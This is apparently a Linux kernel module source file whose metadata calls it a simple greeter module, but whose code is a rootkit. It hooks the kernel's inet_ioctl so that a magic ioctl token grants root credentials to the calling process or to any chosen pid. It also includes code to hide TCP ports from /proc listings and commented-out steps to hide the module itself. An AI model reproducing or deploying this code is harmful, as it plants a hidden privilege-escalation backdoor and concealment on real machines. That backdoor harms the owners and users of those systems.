#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/syscalls.h>
#include <linux/cred.h>
#include <linux/unistd.h> 
#include <linux/mm_types.h>
#include <linux/types.h>  
#include <linux/dirent.h> 
#include <linux/sched.h>  
#include <linux/proc_fs.h>  
#include <linux/namei.h>  
#include <linux/seq_file.h> 
#include <net/tcp.h>      
#include <net/udp.h>
#include <linux/icmp.h>
#include <linux/ip.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/socket.h>
#include <linux/signal.h>
#include <linux/kthread.h>
#include <linux/keyboard.h>

#include "constants.h"
#include "function_hooking.h"

//  Define the module metadata.
#define MODULE_NAME "greeter"
MODULE_AUTHOR("Dave Kerr");
MODULE_LICENSE("GPL v2");
MODULE_DESCRIPTION("A simple kernel module to greet a user");
MODULE_VERSION("0.1");

#define TMPSZ 150

//  Define the name parameter.
static char *name = "Bilbo";
void *version_proc_show_ptr = 0xffffffffb66304d0;
module_param(name, charp, S_IRUGO);
MODULE_PARM_DESC(name, "The name to display in /var/log/kern.log");

// void *get_vfs_iterate ( const char *path )
// {
//     void *ret;
//     struct file *filep;

//     if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL )
//         return NULL;

//     ret = filep->f_op->read;
//     filp_close(filep, 0);

//     return ret;
// }

// static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
typedef int tcp4_seq_show(struct seq_file *,void *);
tcp4_seq_show *tcp4_seq_show_ptr = 0xffffffffb6d78540;

typedef int inet_ioctl(struct socket *, unsigned int, unsigned int);
inet_ioctl *inet_ioctl_ptr = 0xffffffff81f35c70;

struct hidden_port
{
    unsigned short port;
    struct list_head list;
};

LIST_HEAD(hidden_tcp4_ports);

void hide_tcp4_port ( unsigned short port )
{
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if ( ! hp )
        return;
    hp->port = port;

    list_add(&hp->list, &hidden_tcp4_ports);
}

void unhide_tcp4_port ( unsigned short port )
{
    struct hidden_port *hp;

    list_for_each_entry ( hp, &hidden_tcp4_ports, list )
    {
        if ( port == hp->port )
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

static int n_tcp4_seq_show ( struct seq_file *seq, void *v )
{
    int ret = 0;
    char port[12];
    struct hidden_port *hp;

    hijack_pause(tcp4_seq_show_ptr);
    ret = tcp4_seq_show_ptr(seq, v);
    hijack_resume(tcp4_seq_show_ptr);

    list_for_each_entry ( hp, &hidden_tcp4_ports, list )
    {
        sprintf(port, ":%04X", hp->port);
        if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
        {
            seq->count -= TMPSZ;
            break;
        }
    }

    return ret;
}

static int version_proc_show_fake(struct seq_file *m, void *v)
{
	seq_printf(m, "HOOKED!\n");
	return 0;
}

// void *get_inet_ioctl ( int family, int type, int protocol )
// {
//     void *ret;
//     struct socket *sock = NULL;

//     if ( sock_create(family, type, protocol, &sock) )
//         return NULL;

//     ret = sock->ops->ioctl;

//     sock_release(sock);

//     return ret;
// }


void arbitrary_set_root(pid_t pid){
    pr_info("%s: arbitrary_set_root(), pid: %u\n", MODULE_NAME, pid);

    struct task_struct *target_task;
    // Must be called under rcu_read_lock()
    rcu_read_lock();
    target_task = pid_task(find_vpid(pid), PIDTYPE_PID);
    if (target_task == NULL){
        pr_info("%s: arbitrary_set_root(), Failed find task\n", MODULE_NAME);
        rcu_read_unlock();
        return;
    }

    pr_info("%s: arbitrary_set_root(), target_task->cred->uid.val: %d\n", MODULE_NAME, target_task->cred->uid.val);
    if(target_task->cred->uid.val == 0){
        pr_info("%s: arbitrary_set_root(), the process is already root\n", MODULE_NAME);
        rcu_read_unlock();
        return;
    }

    // change task creds to root
    unsigned long o_cr0;
    o_cr0 = disable_wp();
    memset(&target_task->cred->uid, 0, sizeof(uid_t));
    memset(&target_task->cred->gid, 0, sizeof(kgid_t));
    memset(&target_task->cred->suid, 0, sizeof(kuid_t));
    memset(&target_task->cred->sgid, 0, sizeof(kgid_t));
    memset(&target_task->cred->euid, 0, sizeof(kuid_t));
    memset(&target_task->cred->egid, 0, sizeof(kgid_t));
    memset(&target_task->cred->fsuid, 0, sizeof(kuid_t));
    memset(&target_task->cred->fsgid, 0, sizeof(kgid_t));
    restore_wp(o_cr0);

    rcu_read_unlock();
    pr_info("%s: arbitrary_set_root(): Success\n", MODULE_NAME);
}

void set_root(void)
{
    kuid_t curr_uid = current_uid();
    pr_info("%s: set_root(), curr_uid: %d\n", MODULE_NAME, curr_uid.val);

    if(curr_uid.val == 0){
        pr_info("%s: set_root(), the process is already root\n", MODULE_NAME);
        return;
    }

    struct cred *new_cred;
    new_cred = prepare_creds();
    if (!new_cred)
        return;

    /* Run through and set all the various *id's to 0 (root) */
    new_cred->uid.val = 0;
    new_cred->gid.val = 0;
    new_cred->euid.val = 0;
    new_cred->egid.val = 0;
    new_cred->suid.val = 0;
    new_cred->sgid.val = 0;
    new_cred->fsuid.val = 0;
    new_cred->fsgid.val = 0;

    if (commit_creds(new_cred))
        pr_info("%s: set_root(): Failed to set new credentials for the task\n", MODULE_NAME);
    else
        pr_info("%s: set_root(): Success\n", MODULE_NAME);
}

struct s_args
{
    unsigned short cmd;
    void *ptr;
};

static long evil_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long arg )
{
    int ret;
    struct s_args args;
    // pr_info("%s: evil_inet_ioctl cmd: %d\n", MODULE_NAME,  cmd);

    if ( cmd == AUTH_TOKEN )
    {
        ret = copy_from_user(&args, (void *)arg, sizeof(args));
        pr_info("%s: evil_inet_ioctl args.cmd: %d\n", MODULE_NAME,  args.cmd);
        if (ret)
            return 0;

        switch ( args.cmd ){
        case 0:
            set_root();
            break;
        case 1:
        {
            pid_t pid;
            ret = copy_from_user(&pid, (void *)args.ptr, sizeof(pid_t));
            if (ret){
                pr_info("%s: Failed to get pid from usermode\n", MODULE_NAME);
                return 0;
            }
            arbitrary_set_root(pid);
            break;
        }
        default:
            pr_info("%s: evil_inet_ioctl default case\n", MODULE_NAME);
            break;
        }
        return 0;
    }

    hijack_pause(inet_ioctl_ptr);
    ret = inet_ioctl_ptr(sock, cmd, arg);
    hijack_resume(inet_ioctl_ptr);

    return ret;
}


static int __init greeter_init(void)
{
    pr_info("%s: module loaded at 0x%p\n", MODULE_NAME, greeter_init);
    pr_info("%s: version %s\n", MODULE_NAME, "1.0.0");

    hijack_start(inet_ioctl_ptr, &evil_inet_ioctl);
    // Do kernel module hiding
    /* list_del_init(&__this_module.list);
    kobject_del(&THIS_MODULE->mkobj.kobj); */

    // hide_tcp4_port(631);

    // hijack_start(version_proc_show_ptr, &version_proc_show_fake);
    // hijack_start(tcp4_seq_show_ptr, &n_tcp4_seq_show);

    return 0;
}

static void __exit greeter_exit(void)
{

    hijack_stop(inet_ioctl_ptr);
    // hijack_stop(version_proc_show_ptr);
    // hijack_stop(tcp4_seq_show_ptr);

    // unhide_tcp4_port(631);

    pr_info("%s: module unloaded from 0x%p\n", MODULE_NAME, greeter_exit);
}

module_init(greeter_init);
module_exit(greeter_exit);
